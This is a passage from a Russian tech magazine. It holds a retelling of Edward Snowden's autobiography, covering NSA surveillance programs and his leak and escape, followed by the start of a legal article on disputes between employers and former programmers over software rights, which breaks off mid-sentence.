и «разрывом по ракетам» времен холодной вой ны ныне существует «разрыв
по сбору информации» — только про тивником в нем выс тупает не Россия
и не Китай, а родное американское законо датель ство. Мол, оно устарело,
не рассчитано на цифровую эпо ху, никакие суды не будут успевать выдавать
ордера на прослушку — и поэтому нужно прослушивать и записы вать все.
  В качестве последней юридичес кой хитрости предлагалось считать, что
непосредственно акт прослушки сос тоялся, только если информация изы‐
малась из базы данных АНБ для ана лиза, — а само автоматическое сох‐
ранение информации в эту базу, мол, не считается. Также пред лагалось
собирать только метаданные: большинство людей думают, что раз это не
само содержимое их переписки и телефонных звонков, то это ерунда, не сто‐
ящая внимания, а спецслужбы смогут извлечь из них массу полез ных данных.
   Программа называлась STELLARWIND. И была утверждена президентом
Бушем‐младшим еще в 2001 году.


        WWW

                      Если хочешь самостоятельно ознакомиться с тем
                    самым  документом,  то  благодаря  Сно удену,
                       изданию The Guardian и «Википедии» ты можешь
                        это сделать. Вот он, по ссылке. А вот презен‐
                       тация о программе XKEYSCORE, о которой речь
                      пойдет впереди.


Прочитанное потрясло Сноудена. Но что с этим делать, он не знал. А жизнь
его тем временем шла своим чередом. В 2011 году он все еще работал
на Dell, но уже по контракту ЦРУ. Коллеги из Dell были очень впечатлены его
проектом EPICSHELTER и предложили ему подзаработать в качес тве «кон‐
сультанта по решениям» — обещать технологические чудеса дешевле, чем
у конкурентов, и делать что‐то, отдален но похожее на обещанное, загребая
кучу денег. В моде были облачные технологии, и руководству Dell удалось
подрядиться сделать для ЦРУ облако для хранения их данных и выполнения
задач (забегая вперед, ска жем, что в итоге в ЦРУ отказались и от проекта
Dell, и от проекта Hewlett‐Packard — а купили решение на 600 миллионов дол‐
ларов у Amazon). А Сноуден решил, что день ги и море работы помогут ему
отвлечься от мук совести.
  Продолжалось это недолго. От рабочей нагрузки и нервного напряжения
у Сноуде на ухудшилось здоровье. Пришлось взять отпуск по болез ни,
который предоставил ему кучу времени для мрачных размышлений. Чтобы
не сидеть совсем без дела, он занимался проектом Tor — его пытались заб‐
локировать в Иране, и Сноуден работал над шифрованием трафика, которое
позволило бы избегать обна ружения при помощи DPI. (Вероятно, он при‐
ложил свою руку к релизу от сентября 2011 года.)
  На этом момен те кончается вторая часть кни ги — и начинается третья, где
шпионский триллер плавно превращается просто в трил лер.


ПОГРУЖАЯСЬ ГЛУБЖЕ
В 2012 году Сноудена снова ждал контракт с АНБ — на этот раз на Гавайях,
где располагался так называемый туннель Куниа — переоборудованная под‐
земная база времен Второй мировой войны. Проблемы со здоровьем при‐
вели Сноудена к тому, что он нуждался в работе с нагрузкой поменьше, —
и ему досталось место в отделе обмена информа цией. Отдел состоял из него
одного и был посвящен работе с программой Microsoft SharePoint, которая
управляет документооборотом: раз дает поль зователям права на чтение,
правку и рассылку/получение доступных по сети документов.





  Ворота, ведущие в «туннель Куниа». Фотографии изнутри публике недос‐
  тупны

И Сноуден был назначен ее администратором. Тут‐то он и решил окончатель‐
но, что будет изучать документы, проходящие через него, чтобы разобраться
в том, как обстоят дела с массовой слежкой за гражданами США и всего
мира.
  Но сделать это было не так‐то просто. В одних документах встречались
названия программ без объяснения их функций. В других — расплывчатые
описания технически возможных схем, без упомина ния, в какой стадии их
реализация.


Сто рожа сто рожей
Что ж, Сноуден не отступился. Он вос пользовался своими навыками и своей
должностью — и взялся создать авто матизированную систему обмена
информацией между филиалами АНБ и офисами других разведывательных
агентств, имеющих межсетевые свя зи. У каждого из таких отделов были свои
«доски сообщений» (readboards), на которых ежедневно публиковались свод‐
ки событий, составляемые мес тными сотрудниками. Сноуден был их заядлым
читателем, и его личный архив занимал столько мес та, что грозил превысить
квоту на размеры личной пап ки.
   Так что частную инициативу было необ ходимо наделить официальным ста‐
тусом. Используя старые наработки с проекта EPICSHELTER, он внедрил про‐
верку на уникальность сооб щений, добавил функциональность персонали‐
зированной выбор ки сообщений для пользователя по критериям от под‐
разделения разведки до уровня допуска — и про дукт был готов.
  Он назвал свое детище  Heartbeat и получил под него специально
выделенный сервер, единственным адми нистратором которого был он
сам, — охват программы и объем собираемых данных оказался весьма зна‐
чительным. Однажды это даже поставило его под подоз рение — с ним свя‐
зался администратор одного из филиалов и спро сил, зачем эта система пос‐
тоянно копирует все записи из его базы данных. Такая активность показалась
ему подозрительной, и он заблокиро вал дос туп программе Сноуде на.
Но Сноуден объяснил ему смысл инициативы, показал, как работать с поль‐
зовательской частью программы, и моментально заво евал его доверие. Как и
многие коллеги Сноудена, тот мог заподоз рить человека, но машину —
никогда, ведь она просто делала то, на что была запрограммирована.
   Этот инцидент еще больше подтолкнул Сноудена задуматься, как тех‐
нологические возможности системы сами собой порождают потенциал
для злоупотребления, — и изучить подробности того, как его работодатель
и его правительство зло употребля ли воз можнос тями своих  технических
и юридических систем. Программа Heartbeat сильно ему в этом помогла.


Со бирая мозаику
Именно так Сноуден пополнял свой архив материалов: вчи тываясь в сухие
строчки правительственных пос тановлений, которые гласили, что компании
должны передавать правитель ству «любого сорта информацию», которая
«потенциально может иметь отношение  к террористической активнос ти
или деятельности зарубежных раз ведок», на «ежедневной основе».
   Так он узнал, что текущая версия программы для мас совой слежки называ‐
ется PRISM — и что она вклю чает в себя как передачу данных из облачных
хранилищ технологических компаний, в том числе Microsoft, Yahoo, Google,
Facebook, YouTube и Skype. А в пару к ней прилага лась методика так называ‐
емого upstream collection — перехвата данных у магис тральных интернет‐про‐
вайдеров.





               Откуда и какие данные собирает PRISM





         Даты интеграции разных сайтов и компаний в PRISM





              Принцип индекса ции файлов внутри PRISM

Но АНБ не ограничивалось простым сбором информа ции — программа TUR‐
BULENCE, состоящая из двух час тей, была способна на активные действия.
Она работала в усло виях upstream collection — на серверах международных
телекоммуникационных компаний в стра нах, сог ласившихся сотрудничать
с Америкой.
  Первый компонент сис темы, TURMOIL, проверял запросы, проходящие
через него, на соответс твие определен ным критериям — от ключевых слов
до конкретных IP‐адресов или номеров кредиток, — и если запрос оказывал‐
ся подозрительным, то он перенаправлялся во вто рой компонент, TURBINE.
Вместо своего пункта назначения запрос попадал на серверы АНБ, где в него
пытались внедрить скрытые вредонос ные прог раммы, перед тем как вернуть
результат запроса отпра вителю.


             INFO

                      Если у тебя голова кругом идет от бесконечных
                       кодовых  имен  программ,  которые  дела ют
                      похожие вещи, вспомни, что говорилось выше
                      про распределение бюджета на сек ретные про‐
                         екты.  Американская  разведка  очень  хорошо
                     финан сируется — и это только подстрекает ее
                       постоянно обновлять свои системы, дуб лировать
                           их,  расширять  масштабы  работы — лишним
                      не будет, а налогоп лательщики заплатят за все,
                     даже не имея возможности узнать, куда идут их
                       деньги.



Зов пред ков
Изучив разнообразные документы, в которых были в том чис ле отче ты о вза‐
имодействии разведки США с разными общес твенными организациями Аме‐
рики — от конгресса и до Американско го союза защиты гражданских свобод
(ACLU), Сноуден окончательно убедился: система раз деления властей и кон‐
троля со стороны гражданского общес тва имела те же уяз вимос ти, что и мно‐
гие технические системы, с которыми он стал кивался. Ее можно было взло‐
мать, соблюдая букву пра вил, но извра тив дух. Можно было подать судебный
иск против правительства, но суд имел право обращать внимание только
на информацию, которую правитель ство официаль но признавало публично
известной.
  Сноуден — идеалист и любитель исто рии своей страны — знал, что еще в
XVIII веке Америка родилась из протеста против нес правед ливых законов
и провозгласила в числе своих законов следующее: «Обязанность всех слу‐
жащих Соединенных Штатов, равно как и всех их обитате лей, — скорейшим
образом сообщать конгрессу или любому предста вите лю власти о любых
проступках,  подлогах  и  преступлениях,  совершенных любыми  лицами
на государственной службе, о коих им ста нет извес тно».
  Решимость действовать крепла в его душе. Но он знал, что действовать
нужно хладнокровно и рас четливо, тщательно все продумав. Второго шанса
у него бы не было. Так что он вел двойную жизнь — ходил на работу, ничего
не говорил Линдси и прорабатывал свой план.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

  СИСАДМИН ПРОТИВ
         СИСТЕМЫ
              О ЧЕМ ЭДВАРД СНОУДЕН НАПИСАЛ
            В АВТОБИОГРАФИИ PERMANENT RECORD





БЕЗ ПРАВА НА ОШИБКУ
Перед Сноуденом стояла сложная и любопыт ная проблема. У него был
огромный массив служеб ной переписки, техничес кой документации и пре‐
зентаций в Power Point. Если просто вывалить все это на анонимный сайт
в интернете или предложить проекту WikiLeaks с его политикой публикации
любых данных «как есть», без редактуры — то его просто не заметят. Правда
окажется слишком сложной и большой для понима ния публикой. Подобные
примеры уже встречались неоднократно.
  Сноуден пишет о том, как однажды глава технологического отдела ЦРУ
Гас Хант выступал на кон ференции GigaOM Structure и наболтал много такого,
о чем говорить не принято. Он пуб лично, на камеру рас сказывал, что раз‐
ведка жаждет соб рать всю информацию мира и хранить ее вечно. Что они
могут следить за людьми через их смартфоны, даже если те выключены.
  Об этом выступле нии писало изда ние Huﬃngton Post. Видео с той кон‐
ференции выложено на YouTube. Когда Сно уден писал свою книгу, у него
было 313 просмотров. На момент создания этой статьи у него их 3219. Вот
оно, можешь тоже посмотреть.





По иск союз ников
Все это чрезвычайно усложня ло задачу Сноудену. Но в итоге он понял, что
«кто нам мешает, тот нам и поможет». Он решил выбрать журналистов,
которые уже имели проблемы с АНБ из‐за своей чес тной и дотошной работы.
Он остановился на Лоре Пой трас, независимой режис серке‐документалис‐
тке, которой уже доводилось работать с бывшими сотрудни ками АНБ, и Глен‐
не Гринвальде, сотруднике газеты The Guardian, юристе по вопросам граж‐
данских прав и свобод, который впечат лил Сноудена своей дотошностью
и скептицизмом.
  Выбор был сделан. Но нужно было понять, как свя заться с ними, не выдав
себя.
   Что ж, Сноуден всегда считал себя специалистом по вопросам аноним‐
ности в интерне те. Настало время для решительной проверки его навыков.
  Он вооружился дешевым ноутбуком со специаль ной опе рационной сис‐
темой Tails (встроенная поддержка Tor, сокрытие MAC‐адреса и система, уда‐
ляющая все логи работы с компьютером при его выключении), сел за руль
автомобиля и занялся вардрайвингом — поиском уязвимых точек доступа Wi‐
Fi, которые можно было взломать и выйти через них в интернет.


             INFO

                   Об  установке  и  использовании   Tails  читай
                        в статье «Делаем шпионскую флешку с защищен‐
                      ной операционкой Tails».


Сноуден  регулярно менял  одну  взломанную  точку доступа на  другую
и переписывался с журналис тами. Ему пришлось объяснить им, как шиф‐
ровать свою электронную почту. А потом он шел на работу, выполнял свои
рабочие обязанности и обдумывал,  как обойти сис темы безопасности
и вынести секреты из внутренней сети АНБ во внешний мир.


Эксфильтрация
У Сноудена было преимущество: он был сисадмином и поэтому знал, как все
устроено изнутри. К тому же к его услугам была прог рамма Heartbeat. К ней
на тот момент все давно привыкли, но накопленные в ней данные лежали
на выделенном для нее сервере, и их нельзя было просто так оттуда скопиро‐
вать. Рабочие компьютеры АНБ представляли собой маломощные тер‐
миналы, подключенные к облачной системе. Но Сноуден нашел в одном
из подсобных помеще ний склад старых компьютеров Dell — 2009 года выпус‐
ка, но уже списанных за ненадобностью.
  Сноуден притворился, что использует их для проверки совместимости
своей программы Heartbeat с более ста рыми машинами — на случай, если
менее продвинутое  агентство  захочет внедрить ее  у  себя.  Когда он
с огромным системным бло ком в руках попался на глаза начальству, ему уда‐
лось просто отшутиться.
  На эти компьютеры он сумел скопировать файлы, собранные программой
Heartbeat, отобрать из них наиболее важные и скопировать этот архив на кар‐
ты памяти mini‐ и micro‐SD. Запись одной карты занимала часов восемь —
Сноуден снова работал в ночные смены. Никогда еще ожидание конца
копирования не было таким мучительным, вспомина ет он.
  После Сноуден выносил карты памяти с базы, пря ча их в кубике Рубика.
Он подарил несколь ко кубиков коллегам, чтобы все привыкли к виду этой
игрушки, а также специально вертел кубик в руках, болтая с охранниками, —
чтобы те запомнили его как парня с кубиком Рубика. А дома его ждала нер‐
вная бессонница и дол гая воз ня с шифровани ем.
  Шифрование стало новой страстью Сноудена. Он знал, что только длин‐
ный ключ шифрования дает гарантию секретнос ти, которую не могут дать сте‐
ны с колючей проволо кой, охранники и прочие меры безопасности. Пока
у него еще было немного времени, он орга низовал в столице Гавай ев
Гонолулу криптовечеринку — открытую для широкой публики лекцию по воп‐
росам безопасности в интернете. А свои собс твенные данные он зашиф‐
ровал с применением множес твенных zero‐knowledge keys.


Фак тор человеч ности
Напоследок Сноуден решил, что должен лично увидеть, как работают опе‐
раторы системы гло бальной слежки. Он попал в новый офис АНБ на Гавайях,
еще не до конца достроенный, куда планировалось посадить правитель‐
ственных хакеров из подразделения Tailored Access Operations и отдел Na‐
tional Threat Operations Center, перед которым стояла задача разрабаты вать
меры защиты от кол лег из других стран. Оба отдела дол жны были работать
с программой XKEYSCORE, на которую Сно уден и желал взглянуть.
  Со времен Женевы Сноуден не занимался никакой нас тоящей шпионской
деятельностью — он только изучал крупные сис темы и читал документы.
Но здесь ему пришлось выступить в роли ана литика — то есть непосредс‐
твенно наблюдать за живыми людь ми. Программа работала с различны ми
идентификаторами: IP‐адресом, номером телефона или физическим адре‐
сом — и показывала, что человек с этим идентификатором делал в сети.
Письма, история браузера, активность в социаль ных сетях...
  При этом контроль за операторами системы практичес ки отсутствовал.
Достаточно было сформулировать свой запрос в систему в служебном фор‐
мате, а не обычным текстом — и мож но было шпионить за политиками и биз‐
несменами по всему миру. Но коллеги Сноудена предпочитали другие раз‐
влечения, которые они называли LOVEINT (по ана логии с HUMINT и SIGINT).
То есть слежку за своими бывшими подружка ми (а также нынешними под‐
ружками и просто приглянувшимися им случайными женщинами). А если
кто‐то во вре мя работы натыкался на чужие интимные фотографии, хорошим
тоном считалось показывать их коллегам.





  «Уникальные данные, выходя щие за пределы поль зовательской
  активности из пол ноохватно го потока переднего края», или мастерство
  обтекаемых формулировок

Но окончательно добил Сно удена малень кий эпизод, слу чившийся, когда он
наблюдал за активностью инженера из Индонезии, вся подозрительность
которого заключалась в том, что он отпра вил резюме на вакансию в иранском
университете. С того момента АНБ следило за ним, и Сноуден изу чал его
досье. В досье были фотографии и видео (вероятно, запись виде озвонка
или перехват картинки с веб‐камеры), где ученый занимался за компьютером,
держа на коленях малень кого ребенка. Ребенок не сидел спокойно, возился,
играл и заглянул прямо в камеру. Пос ле этого эпизода Сноуден понял: он
увидел все, что хотел.


ВЕЛИКИЙ ПОБЕГ
Все было готово для переда чи файлов журналистам. Оставалось только
решить, что делать с последс твиями этой переда чи — Сноуден ни на секунду
не сомневался, что его очень быстро най дут. Он знал, что некоторые из фай‐
лов в его архиве содержали метаданные, которые привели бы расследование
прямо к нему. А рассле дова ние гарантирова ло долгий тюремный срок в край‐
не суровой тюрьме. В лучшем случае.
   Так что надо было бежать из стра ны. Он перебирал варианты и не находил
их. В Европе власти пошли бы на уступки американцам. В Латинской Аме рике
или Африке спецслужбы смогли бы провес ти тайную опе рацию. Побег
в Китай, Россию или на Ближний Восток автоматически выставил бы его
перед публикой пособ ником вра гов Америки.
  Он выбрал Гонконг, надеясь на своеобразный статус этой территории —
между Китаем и западным миром, где ни одна спецслужба не рис кнет под‐
нимать много шума.
  Он зазвал свою мать в гости на Гавайи, к Лин дси — чтобы они поддержи‐
вали друг друга. Он соб рал свой скудный багаж, в который входили четыре
ноутбука — для обыч ных дел, для безопасной свя зи, пустышку, на котором
ничего не было, и компь ютер, который он никогда не подключал к интернету.
  Сноуден отпросился с работы, сос лавшись на обострение своих проблем
со здоровьем. Он оставил свой смартфон на кухне вмес те с запиской
для Линдси — мол, срочная командировка, не знаю, когда вернусь. Подписал
ее своим прозвищем, дописал сло ва любви — и поехал в аэропорт. Там он
за наличные купил билет на ближайший самолет в Токио, где так же за налич‐
ные сел на рейс до Гонконга.


Залечь на дно в Гон конге
В Гонконге Сноуден заселился в отель и повесил на двери номера табличку
«Не беспокоить». Ему оставалось только ждать, кто доберется до него пер‐
вым — журналисты или агенты раз ведки. В Гонконг он прибыл 20 мая, но жур‐
налистов пришлось ждать до 2 июня. Он назначил им встречу в углу рес‐
торана при отеле и сказал, что будет держать в руках кубик Рубика.





                  Герой статьи и его верный товарищ

Журналисты, по их сло вам, ожидали увидеть перед собой смертельно боль‐
ного ветерана разведки, курящего одну сигарету за дру гой. Сложно предста‐
вить, что у такого молодого парня в руках может ока заться подобный архив
документов — и такая готовность сло мать свою успешную, обеспеченную
жизнь.
  Сам Сноуден ужасно нервничал, когда на него нас тавили камеру. Он при‐
вык держаться в тени — а тут на него собирался смотреть весь мир. Он
переживал обо всем на свете, включая бардак в номере. Но вот оно, видео
с самого первого дня их встречи, — и по нему совсем незаметно, какая буря
бушевала в душе Сноудена.





Впрочем, никакие душевные волнения не мог ли сравниться с тем штормом,
который поднялся в мире пос ле публикации разоб лачительных статей. Сно‐
уден не побоялся выступить со своим заявлением, не скры вая  лица,
и понимал возможные пос ледс твия таких дей ствий — но плана на жизнь пос‐
ле разоблачения у него не было. Он слишком много думал о том, как дожить
до этого момента и не проколоться, и слишком опа сался, что этого может так
и не случиться.
  Зато никто не мог обвинить его в сот рудничес тве с инос транными раз‐
ведками, потому что он не просил убежища ни в какой стране. Так что его
бывшим работо дателям приходилось искать дру гие способы дискредити‐
ровать разоблачителя. Идейное несогласие не входило в их кругозор — про‐
фессиональный цинизм разведчиков приравнивает идеализм к идиотизму,
но человек, который обвел вокруг пальца могущественную спецслужбу, явно
не мог быть идиотом. Система пыталась осмыслить произошедшее в своих
терминах, найти корыстную мотивацию — и не могла.





           Демонстрация в поддержку Сноудена в Гонконге

А Сноуден тем временем покинул отель через один из запасных выходов
и скрывался в бедных кварталах, среди бежен цев. Журналис ты познакомили
его с местными юристами, решившими взяться за его дело, — и у них ока‐
зались неожиданные и весь ма полезные знакомства. Привыкший к вполне
обеспеченной жизни Сноуден был поражен и растроган тем, как бедные люди
с готовностью безвозмездно делили с ним свои чрезвычай но скромные
ресурсы и жилье, более тесное, чем его бывший номер в отеле.
  Видеообращение Сноудена вышло 9 июня, а к 14 июня правительство
США уже вме нило ему обвинения в шпи она же. 21 июня — в день рождения
Сноудена — они разослали запросы на его экс тра дицию. Юристы Сноудена
с горечью сообщили ему о том, что ООН не может признать его беженцем, —
власти Гонконга отказались с ними сотрудничать и дали понять, что Сноудену
здесь не рады.
  Он стер все данные со сво их компь юте ров и уничтожил криптографичес‐
кие клю чи — дело было сделано, и можно было избавиться от лишних сви‐
детельств. Нужно было думать, куда нап равить ся дальше и кто может ему
помочь.


Кто поможет изгою?
Никто из официальных лиц помочь Сноудену не мог — все слишком боялись
гнева США. От Исландии до Индии максимум, на что можно было рассчи‐
тывать, — это неофициальный совет «ради вашего же блага не въезжайте
на нашу территорию». Робкая надежда была лишь на Эквадор — маленькая
латиноамериканская страна уже укрывала в сво ем посольстве Джу лиана
Ассанжа, а ее президенту уже доводилось идти против США и бороться
с сетью влияния американских спецслужб в регионе.
  С получением убежища в Эква доре Сноудену собиралась помочь Сара
Харрисон, редактор сайта WikiLeaks, у которой к тому же были родствен‐
ники‐юристы в Гонконге. С Джу лианом Ассанжем Сноуден только перепи‐
сывался, и не очень долго — в чем‐то у них образовались разногласия,
и характер Ассанжа казался Сноудену тяжелым и неконструктивным. Но Сара
Харрисон могла помочь и словом, и делом, и Сно уден не собирался отка‐
зываться от помощи. Она свя залась с эквадорским консулом в Лондоне,
Фиделем Нарваэсом, и тот под свою ответственность выписал Сноудену спе‐
циальный паспорт ООН, который должен был помочь ему добраться до Эква‐
дора.
  Прямого рейса из Гонконга до столицы Эквадора Кито не сущес твует.
Нужно было лететь с нес колькими пересадками — через Москву, Гавану
и Каракас. Любые другие маршру ты вели через воздушное прос транство
союзников НАТО, что было чревато крупными неприят ностя ми.
  В аэропорту Сара не отходила от Сноудена ни на шаг. Она говорила, что
делает это не ради его защиты, — никто не смог бы его защитить. Но наличие
профессионального и неотступного свидетеля могло немного затруднить
вмешательство — и в итоге 23 июня они приземлились в Шереметьеве.
  Разумеется, их там ждали. Разумеется, Сара не оставила Сноудена — их
вместе провели на встречу с представителями ФСБ. Они пытались убе дить
Сноудена посотрудничать с ними, но он с самого начала знал, что речь зай‐
дет об этом, и отказывался. Тогда они выложили карты на стол: пока самолет
со Сноуденом летел из Гонконга в Мос кву, американский Госдепартамент
отозвал его паспорт. Вольно или невольно, но именно американское пра‐
вительство вынудило Сно удена остаться в России — уехать он не мог.





                   Переполох в Шереметьеве

Больше месяца он сидел в Шереметьеве, осаж даемый журналис тами.
Это создавало всем мас су неудобств и даже выз вало допол нительный меж‐
дународный скандал — самолет президента Боливии Эво Моралеса, при‐
летавшего  в Москву  на  конференцию  по  воп росам  экспорта  газа,
на обратном пути был принудительно посажен в Австрии, пос кольку аме‐
риканцы подозревали, что Сноуден может быть на борту. Но его там не было.
  В конце концов российские влас ти выписа ли Сноудену разрешение
на временное пребывание в Рос сии.


Раз лука и встре ча
Тем временем в Америке думала, что же ей делать, Линдси. Сноуден при‐
водит отрывки из ее дневника за июнь и июль, из которых становится понят‐
но, что она узнала о произошедшем только 9 июня — когда Сноуден опуб‐
ликовал свое видеооб ращение. Все это время она нервничала и переживала,
а ее уже осаждали агенты АНБ, которые сначала искали пропавшего сот‐
рудника и не могли ей ничего предъ явить, но отча янно упрашивали посот‐
рудничать с ними доб ровольно.
   У Линдси была лучшая подруга Сандра. Мать Сандры Эйлин обладала
несгибаемым характером, а также некото рыми связями среди местных
политиков в районе города Сан‐Диего. Решив, что будет защищать Линдси
от назойливых агентов, она не только нашла ей юрис та, но и рассказала
девушке Сноудена,  как пользовать ся одно разовыми телефонами,  лихо
водила машину, пытаясь уйти от следующих за ними черных джипов, и убе‐
дила Линдси снять со своих банковских счетов все деньги. Эйлин говорила,
что всему этому ее научил трудный раз вод.
   Агенты допрашивали Линдси и пытались узнать, не скрыт ли в их перепис‐
ке со Сноуденом какой‐нибудь код. Они ходили за ней даже в магазин одеж‐
ды и убеждали, что дела ют все это ради ее же безопасности. В новостях и в
интернете о ней распростра няли гряз ные сплетни. Но компания под руг
и матери Сноудена помогала ей держаться, и советы Эйлин оказались дос‐
таточно хороши, чтобы пресса потеряла ее из виду.
  Зимой 2014 года Линдси прилетела к Сноудену в Москву. Сноуден ждал
этой встречи с тревогой — он пережи вал, что плохо пос тупил с Линдси,
и думал, что когда она его встретит, то надает ему пощечин. Но вместо этого
она осталась с ним в Мос кве и стала вытаскивать его из квартиры на прогул‐
ки. Она выучила русский язык даже лучше, чем Сноуден. В 2017 году они
поженились в московском ЗАГСе.


ПОСЛЕ БАЛА
Что же было потом? И каковы ока зались итоги разоб лачений Сноудена? Если
тебе кажется, что ничего не изменилось, то это не так — и вот примеры.
 • На волне публичного возмущения корпорации стали внедрять в свои про‐
   дукты хоть какое‐то, но шифрование. Пока разведка давила на них втайне,
   они были вынуждены подчинять ся, но, когда у них появилась воз можность
   опереться на публичное мнение, им стало легче противос тоять невыгод‐
  ным для себя усло виям.
 • В интерне те выросло число сайтов, использующих HTTPS вместо незащи‐
  щенного HTTP, и в 2016 году зашиф рованного трафика наконец‐то стало
   больше, чем незашифрованного.
 • В Европе приняли закон GDPR.

Иными словами, люди действительно стали чаще задумываться о своей при‐
ватности. А с ростом интереса и спроса на такие технологии рас тет и пред‐
ложение.
  Сноуден возглавил некоммерческую орга низа цию Freedom of the Press
Foundation, в которой работает вмес те с журналис тами, поведавшими миру
его историю, и многими дру гими дос тойными людьми. Они поддерживают
независимую журналистику, помога ют другим разоблачителям и разрабаты‐
вают технические средства, облегчающие подобную деятельность. Нап‐
ример, разработанная ими программа SecureDrop пользуется популярностью
у многих новостных агентств и дает воз можность передать информацию, сох‐
раняя анонимность отпра вителя.
   Но, как мы все прекрасно знаем, проб лема при ватности и сбора данных
в интерне те не уходит в прошлое, а лишь становится актуальнее с каждым
днем. Те средства, что ког да‐то были дос тупны лишь раз ведывательным
агентствам, ныне используются корпораци ями — которые вдобавок ко всем
недостаткам разведок еще и движимы жаж дой наживы. Нас окружают мно‐
гочисленные огромные  системы,  которые не  только собирают о  нас
информацию, но и принимают на ее основе какие‐то решения. И когда эти
системы ошибаются — или наобо рот, когда они работают с бес человечной
точностью, слепо повинуясь любым заложенным в них правилам, — пос ледс‐
твия ложатся не на систему, а на нас, обычных людей.
  Однако пример Эдварда Сноудена показывает, что человек может про‐
тивостоять системе. Что высокие идеалы можно сочетать с высочайшим про‐
фессионализмом. Что в мире по‐прежнему есть место старомодной хакер‐
ской романтике. Информа ция хочет быть сво бодной. Сигнал не остановить.
«Майор поскользнется, майор упадет».
   Вот о чем его книга. О том, что Системы окру жают нас повсюду. О том, что
они уязвимы и нуждаются в людях, доб росовес тно делающих свое дело.
О том, что необходимо задаваться философскими вопросами и точно так же
необходимо разбираться в техничес ких подробностях. И все это при годится
тебе, если придется выбирать, какое место в какой системе занимать.
   Пусть эта статья и книга Сноудена помогут тебе сделать правильный
выбор.
ПРИВАТНОСТЬ

КОРПОРАТИВНЫЙ
    КОПИРАТ





         О КОНФЛИКТАХ
      МЕЖДУ РАБОТОДАТЕЛЯМИ
         И СОТРУДНИКАМИ
    ПО ИСКЛЮЧИТЕЛЬНЫМ ПРАВАМ





Рыба ищет, где глубже, а человек — где
лучше платят и предлагают более прив‐
лекательные условия труда. Программисты
часто   меняют   компанию‐нанима теля
и порой уносят с собой из старого офиса         Денис Доротенко                                                                               Юрист Яндекса
не только авторучку или любимую кружку
с  корпоратив ной символикой, но  также
кое‐какие  собс твенные  наработки,  что
не может не вызвать недовольства их быв‐
ших руководителей. Иногда это ста новится
причиной судебных разбирательств и даже
уголовного  преследова ния быв ших  сот‐
рудников. О правовых аспектах подобных
инцидентов — сегодняшняя статья.


ВВЕДЕНИЕ
Как мы знаем из СМИ, между компаниями «АльтЭль» и «НумаТех» произошел
конфликт. Суть его такова: бывшие сот рудники «АльтЭль» во главе с бывшим
генеральным директором этой же компании создали «НумаТех» и (по версии
представителей «АльтЭль») под видом программных продуктов собственной
разработки офор мили в Роспатенте государственную регис трацию на прог‐
раммное обеспечение «АльтЭль».
   Это далеко не первый случай в Рос сии, когда две организации конфлик‐
туют  из‐за  трудовой деятельнос ти бывших сотрудни ков одной из  них,
перешедших в другую: вспомним, например, судебный спор между НПЦ маг‐
нитной гидродинамики и ООО «УНИМЕТ», в котором НПЦ пытал ся привлечь
к ответственности компанию за деятельность ее гендиректора Е. А. Павлова,
ранее работавшего в Центре руководителем про ектов. Экс‐руководитель (по
мнению НПЦ) нарушил пра ва Центра на секреты производства (ноу‐хау).


             INFO

                  С деталя ми это го разбирательства более под‐
                      робно можно ознакомиться здесь, а детали, каса‐
                    ющиеся ноу‐хау в целом, изложены в этой статье.


Больше всего обращает на себя внимание в этом споре то, что конфликт пов‐
лек за собой возбуждение уголовного дела по ч. 1 ст. 146 УК РФ, а вот
это уже серьезно.
  Возбуждение уголовного дела в Рос сии по такой статье УК — явление
относительно редкое, а по час ти нарушения авторских прав на принад‐
лежащий работодателю программный код и подавно  (в этом контексте
не берем во внимание дела, связанные с нелегальной раздачей софта
на торрент‐трекерах и подоб ным). Так что сто ит следить за новостями по это‐
му спору, а пока давай немного поговорим о том, что вообще представляет
собой наруше ние прав работодателя на прог раммный код, какие были
релевантные судебные (не уго ловные) дела, связанные с софтом, базами
данных, и на что в подобных случаях сто ит обращать внимание.


КОНФЛИКТЫ ИЗ-ЗА ПРОГРАММНОГО КОДА
Такие конфликты возникают довольно час то, и думаю, каждый назовет
два‐три подобных примера из собственного опыта либо опы та близких зна‐
комых. Порой  такие  конфликты  заходят  даль ше  взаимных  претензий
и перемещаются в судебную плоскость. Предлагаю ознакомиться с рядом
случаев, где спо ры решались как раз в суде.


АИИС КУЭ
В 2010 году ООО «Сенал» подало в суд на своего бывшего работника. Сот‐
рудник (Б. О.) разработал программное обеспечение АИИС КУЭ и веб‐при‐
ложение АИИС КУЭ. 4 июня 2010 года он был уволен по собственному
желанию. В связи с уволь нением ему пос тупило распоряже ние передать свои
разработки, сопроводительную документацию и исходные коды созданных им
служебных программных продуктов. Исходные коды и полная сопроводитель‐
ная документация переданы не были — как сооб щил Б. О., он их удалил
и отформатировал диск на своем рабочем компьютере случайно, но писать
объяснительную записку по это му поводу отка зал ся.
   15 июля 2010 года прог раммное обеспечение АИИС КУЭ, разработанное
Б. О., перестало нор мально функционировать. Проверка причин выяснила:
программа работает толь ко до 14.06.2010, поскольку ее создатель намерен‐
но сделал так, чтобы пос ле этой даты продукт перестал выпол нять свою
основную функцию.
  Суд признал, что исклю читель ное пра во на указанное ПО действительно
принадлежит ООО «Сенал» как работо дателю ответчи ка.
  Суд также принял в качестве доказательства акт экспертизы жесткого дис‐
ка, составленный специальной комиссией для расследования факта исчезно‐
вения с персонального компь ютера Б. О. исходных кодов и сопроводитель‐
ной документации созданного им ПО. Согласно акту, этот винчестер был раз‐
бит на три раздела (на пер вом стояла Windows; два других не имели фай‐
ловой системы, что не позволяло получить пря мой доступ к файлам и папкам
пользователя). Для получения файлов с раз делов 2 и 3 было необходимо
воспользоваться сторонним ПО для восста новления данных.
  С помощью демоверсий прог рамм GetDataBack, EasyRecovery и R‐Studio
Network Edition жесткий диск был просканирован, и на нем обнаружились
ссылки на необходимые файлы. Это поз волило пред положить, что фай лы
ранее хранились на компь ютере, а затем были с него удалены, восстанов‐
ление файлов невозможно.
   Суд, принимая во внимание специфику уда ления программы с компьюте‐
ра в целом, специальные поз нания Б. О. в этой области и предпринятые им
действия (установка пос ледней даты использования программного продукта
без указаний на это работодателя), пришел к выводу об умышленном при‐
чинении Б. О. ущер ба ООО «Сенал». Размер ущерба (179 тысяч рублей) был
рассчитан исходя из объема работ, свя занных с созданием программы. Суд
обязал бывшего сотрудника возместить ООО «Сенал» такой ущерб.


«1С:Пред приятие»
9 апреля 2012 года Заводский районный суд г. Кемерово вынес приговор,
по которому обвиняемый был признан виновным по ч. 1 ст. 272 УК РФ «Неп‐
равомерный доступ к компьютерной информации».
  Суд установил, что в июле 2011 года граж данин из своего дома неп‐
